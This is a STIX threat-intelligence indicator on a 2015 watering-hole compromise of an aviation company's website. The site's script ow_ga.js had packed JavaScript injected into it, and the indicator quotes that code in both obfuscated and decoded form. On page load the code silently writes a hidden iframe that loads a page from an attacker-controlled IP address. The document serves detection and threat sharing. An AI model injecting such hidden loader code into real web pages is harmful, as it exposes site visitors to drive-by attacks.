stix:STIX_Header.stix:Title: Compromised Aviation Watering Hole Redirects to a Malicious Site
stix:STIX_Header.stix:Description:
On 1 February 2015, it was observed that the legitimate, aviation website www.impgroup.com redirected to http://173.255.211.183/Jquery/Jquery.php.
On 13 February 2015, a U.S. Government Agency also reported this redirect activity from www.impgroup.com.
On 23 February 2015, a third-party indicated this site was used as a watering hole attack. Similar activity was previously tracked under the name Emissary Panda in 2014.
This activity is similar to that reported in IB-15-10076.

stix:Indicator.indicator:Description:
Users were redirected to this site from http://www.impgroup.com/en/home/default.aspx to the embedded script http://www.impgroup.com/core/scripts/ow_ga.js.
This script contained the following code:
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('6.7("<2 5=0 3=0 4=\'8://c.d.9.a/1/1.b\'></2>");',14,14,'|Jquery|iframe|height|src|width|document|write|http|211|183|php|173|255'.split('|'),0,{}))
The deobfuscated code revealed the following:
document.write("<iframe width=0 height=0 src='http://173.255.211.183/Jquery/Jquery.php'></iframe>");
This site redirected to http://173.255.211.183/Jquery/Jquery.php.
The IP address 173.255.211.183 was registered in the United States.
